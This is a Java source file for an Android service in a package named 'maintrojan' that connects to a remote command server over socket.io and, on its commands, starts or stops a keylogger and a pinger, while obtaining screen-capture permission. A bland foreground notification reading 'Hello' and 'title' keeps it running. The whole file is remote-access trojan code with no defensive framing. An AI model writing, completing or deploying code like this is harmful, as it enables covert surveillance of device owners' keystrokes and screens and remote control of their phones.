package com.example.maintrojan;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.URISyntaxException;

import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class MyService extends Service {
    private static final String TAG = "myTrojan";
    private static final String channelID = "myTrojan";
    String MY_IP,MY_PORT ;
    private final long reconnectTime = 1*1000;
    private Socket sock=null;
    public MediaProjectionManager mProjectionManager;
    public MediaProjection mProjection;
    Capture capture;
    Handler handler = new Handler();
    Pinger pinger = new Pinger();
//    ClickEvt clickEvt = new ClickEvt();

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Socket.io Handlers
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
//                    sock = IO.socket("http://"+getString(R.string.MY_IP)+":"+getString(R.string.MY_PORT));
//                    sock.connect();
                    Connecting.connect(getString(R.string.MY_IP),getString(R.string.MY_PORT),reconnectTime);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                sock = Connecting.getSock();
//                Log.d(TAG, "run: "+(sock==null));

                // Getting neccessory permissions
                mProjectionManager =  (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                mProjection = mProjectionManager.getMediaProjection(intent.getIntExtra("resultCode", Activity.RESULT_CANCELED),intent.getParcelableExtra("data"));
//                capture = new Capture(sock,getApplicationContext(),mProjectionManager,mProjection,2,handler);
//                capture.setup();

                // Ping Handler
                sock.on("ping", new Emitter.Listener() {
                    @Override
                    public void call(Object... args) {
                        try {
                            JSONArray array = (JSONArray) new JSONArray((String) args[0]);
                            if(array.getString(0).equals("start")){
                                pinger.changeVars(array.getString(1),array.getInt(2),array.getInt(3));
                                pinger.start();
                            }else{
//                            Log.d(TAG, "Stop Ping");
                                pinger.stop();
                            }
                        } catch (JSONException e) {
                            e.printStackTrace();
//                        Log.d(TAG, "ERROR : "+e.getMessage());
                        }
                    }
                });

                // Logger Handler
                sock.on("logger", new Emitter.Listener() {
                    @Override
                    public void call(Object... args) {
//                        Log.d(TAG, "logger");
                        try {
                            JSONArray array = (JSONArray) new JSONArray((String) args[0]);
                            if(array.getString(0).equals("start")){
                                Keylogger.start();
//                            Log.d(TAG, "calling by sock");
                            }else{
                                Keylogger.stop();
                            }
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                });

                sock.on("click", new Emitter.Listener() {
                    @Override
                    public void call(Object... args) {
                        Log.d(TAG, "click");
                    }
                });
            }
        }).start();

        NotificationChannel channel = new NotificationChannel(
                channelID,channelID, NotificationManager.IMPORTANCE_LOW
        );
        getSystemService(NotificationManager.class).createNotificationChannel(channel);
        Notification.Builder notification = new Notification.Builder(this,channelID)
                .setContentText("Hello")
                        .setContentTitle("title")
                                .setSmallIcon(R.drawable.ic_launcher_background);


        startForeground(101,notification.build());



        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }



}
